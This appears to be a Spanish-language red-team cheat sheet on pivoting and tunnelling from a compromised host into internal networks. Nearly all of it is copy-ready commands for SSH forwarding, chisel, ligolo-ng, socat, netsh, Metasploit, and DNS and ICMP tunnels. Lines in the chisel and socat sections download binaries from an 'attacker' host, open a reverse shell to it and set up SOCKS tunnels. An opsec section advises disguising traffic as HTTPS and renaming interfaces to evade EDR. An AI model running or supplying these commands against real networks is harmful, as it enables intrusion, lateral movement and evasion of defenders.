---
aliases:
  - Pivoting
  - Port Forwarding
  - Tunneling
  - Pivoteo
tags:
  - type/atomic
  - technique/lateral-movement
  - technique/pivoting
  - technique/tunneling
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Exploitation]]"
tertiary categories:
  - "[[Lateral Movement]]"
linked:
  - "[[Active Directory Exploitation]]"
  - "[[Metasploit Framework]]"
  - "[[netexec]]"
  - "[[SSH (22) - Enumeración]]"
  - "[[Proxychains]]"
---
# Pivoting & Port Forwarding

***

## Overview

Acceso a redes internas detrás del host comprometido (pivote). Técnicas:

- **Port forward**: mapear un puerto remoto a uno local (o viceversa).
- **SOCKS proxy**: proxyficar cualquier cliente TCP/UDP al pivote.
- **Tunneling**: encapsular tráfico por protocolo autorizado (HTTP/S, DNS, ICMP).

Preferencia operativa:

1. **SSH** si hay creds + acceso SSH → cero tooling extra.
2. **chisel / ligolo-ng** si no hay SSH o target Windows.
3. **SOCKS via C2 / meterpreter** si ya hay implant activo.
4. **DNS / ICMP tunneling** último recurso (lento, detectable).

***

## SSH port forwarding

### Local (`-L`)

Tu puerto local → servicio detrás del pivote.

```bash
ssh -L 8080:10.10.20.5:80 user@pivot
# localhost:8080 → pivot → 10.10.20.5:80
```

Múltiples + background + keepalive:

```bash
ssh -fN -L 8080:10.10.20.5:80 -L 3306:10.10.20.10:3306 user@pivot \
    -o ServerAliveInterval=30
```

### Remote (`-R`)

Abre puerto en el pivote que apunta a tu máquina.

```bash
ssh -R 4444:localhost:4444 user@pivot
# pivot:4444 → attacker:4444 (listener)
```

Útil para reverse shells cuando el pivote tiene egress restringido.

### Dynamic (`-D`) — SOCKS

```bash
ssh -fN -D 1080 user@pivot
# Proxy SOCKS5 en localhost:1080 → toda conexión desde attacker atraviesa el pivote
```

Configurar `/etc/proxychains4.conf`:

```
[ProxyList]
socks5 127.0.0.1 1080
```

Uso:

```bash
proxychains -q nxc smb 10.10.20.0/24
proxychains -q nmap -sT -Pn -n 10.10.20.10       # solo -sT (full TCP)
```

### SSHuttle (VPN-over-SSH)

```bash
sshuttle -r user@pivot 10.10.20.0/24
# Toda la subred accesible directamente sin proxychains
```

DNS también:

```bash
sshuttle --dns -r user@pivot 10.10.20.0/24
```

***

## chisel

Reverse-SOCKS multiplexado sobre HTTP/WebSocket. Binario Go, cross-compilable.

### Reverse SOCKS (más común)

```bash
# Attacker (server)
chisel server --reverse -p 8000

# Pivot (client) — conecta de vuelta al attacker
chisel client <attacker>:8000 R:1080:socks
```

Attacker ahora tiene SOCKS5 en `localhost:1080`.

### Reverse port forward

```bash
# Pivot
chisel client <attacker>:8000 R:8080:10.10.20.5:80
# Attacker:8080 → 10.10.20.5:80
```

### Forward (attacker → pivote)

```bash
# Pivot (server)
chisel server -p 8000

# Attacker (client)
chisel client pivot:8000 1080:socks
```

### TLS + auth

```bash
chisel server --reverse -p 443 --tls-domain attacker.com --auth user:pass
chisel client --auth user:pass https://attacker.com R:1080:socks
```

Transferencia al pivote:

```bash
curl http://attacker/chisel -o /tmp/chisel && chmod +x /tmp/chisel
# Windows: certutil -urlcache -split -f http://attacker/chisel.exe chisel.exe
```

***

## ligolo-ng

TUN interface → rutas nativas IPv4/IPv6, sin proxychains. Más rápido y estable que chisel para subnets completas.

### Setup

```bash
# Attacker: crear TUN
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# Pivot (agent, conecta al attacker)
./agent -connect <attacker>:11601 -ignore-cert
```

### Console del proxy

```
ligolo » session
ligolo » [Agent : user@pivot] » ifconfig
ligolo » [Agent : user@pivot] » start
ligolo » [Agent : user@pivot] » tunnel_start
```

Desde attacker:

```bash
sudo ip route add 10.10.20.0/24 dev ligolo
nmap 10.10.20.10               # conexiones nativas
nxc smb 10.10.20.0/24
```

### Reverse tunnel (acceso a attacker desde pivote)

```
ligolo » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
```

***

## socat

### Relay TCP

```bash
# En pivote, expone 10.10.20.5:80 en pivote:8080
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.20.5:80
```

### Reverse shell encrypted

```bash
# Attacker
socat OPENSSL-LISTEN:4443,cert=cert.pem,verify=0,fork -

# Victim
socat OPENSSL:attacker:4443,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

### UDP → TCP relay

```bash
socat TCP-LISTEN:8053,fork UDP:internal-dns:53
```

***

## netsh (Windows nativo)

Sin binarios externos, pero deja trazas en registry.

```cmd
:: Forward 8080 en pivote → 10.10.20.5:80
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.20.5

:: Listar
netsh interface portproxy show all

:: Borrar
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
netsh interface portproxy reset
```

Firewall rule si hace falta:

```cmd
netsh advfirewall firewall add rule name="fwd8080" dir=in action=allow protocol=TCP localport=8080
```

***

## Metasploit pivot

### autoroute + socks proxy

```
meterpreter > run autoroute -s 10.10.20.0/24
msf6 > route print
msf6 > use auxiliary/server/socks_proxy
msf6 > set VERSION 5
msf6 > set SRVPORT 1080
msf6 > run -j
```

Uso desde fuera:

```bash
proxychains nmap -sT -Pn 10.10.20.10
```

### portfwd meterpreter

```
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.20.10
meterpreter > portfwd add -R -l 4444 -p 4444    # reverse
meterpreter > portfwd list
meterpreter > portfwd flush
```

Ver [[Metasploit Framework]].

***

## DNS / ICMP tunneling (último recurso)

### iodine (DNS)

```bash
# Attacker (authoritative para sub.attacker.com)
iodined -f -c -P <pass> 10.8.0.1/24 sub.attacker.com

# Pivot
iodine -f -P <pass> sub.attacker.com
```

Luego SSH sobre la tun0: `ssh -D 1080 user@10.8.0.1`.

### ptunnel (ICMP)

```bash
# Attacker
ptunnel -x <pass>

# Pivot
ptunnel -p attacker -lp 8000 -da target -dp 22 -x <pass>
ssh -p 8000 user@localhost
```

Detectable con cualquier IDS que mire payloads de echo. Solo si TCP/UDP egress está bloqueado.

***

## Reconocimiento desde el pivote

Antes de tunelizar, mapear desde el pivote:

```bash
# Interfaces + rutas internas
ip a / ip r
# Windows: ipconfig /all ; route print

# Conexiones activas
ss -tnp / netstat -anp
# Windows: netstat -ano

# ARP cache (hosts live recientes)
arp -a

# Host discovery sin nmap (stealth)
for i in {1..254}; do (ping -c1 -W1 10.10.20.$i >/dev/null && echo "up: 10.10.20.$i") & done
```

Windows desde memoria (Invoke-*):

```powershell
Invoke-Portscan -Hosts 10.10.20.1-254 -Ports "21,22,80,443,445,3389"
```

***

## Checklist por tipo de acceso

| Acceso al pivote | Opción recomendada |
|---|---|
| Shell SSH + creds | `ssh -D` / sshuttle |
| Shell Windows cmd/PS | chisel reverse-SOCKS o ligolo-ng |
| Meterpreter | autoroute + socks_proxy + portfwd |
| Web shell sin exec persistente | reGeorg / Neo-reGeorg / pivotnacci |
| Sólo egress HTTP | chisel TLS / godoh |
| Sólo egress DNS | iodine / dnscat2 |
| Sólo egress ICMP | ptunnel / icmpsh |

***

## Opsec

- Chisel/ligolo sobre TLS + puerto 443 → mimetiza HTTPS.
- Evitar `proxychains nmap -sS` — requiere root en attacker Y no funciona limpio. Usar `-sT -Pn`.
- `autoroute` en Metasploit es in-memory del meterpreter — muere con la sesión.
- Netsh portproxy sobrevive reboots; borrar al salir.
- Ligolo TUN names: renombrar lejos de `ligolo` si hay EDR mirando interfaces.

***

## Referencias

- chisel: https://github.com/jpillora/chisel
- ligolo-ng: https://github.com/nicocha30/ligolo-ng
- sshuttle: https://github.com/sshuttle/sshuttle
- proxychains-ng: https://github.com/rofl0r/proxychains-ng
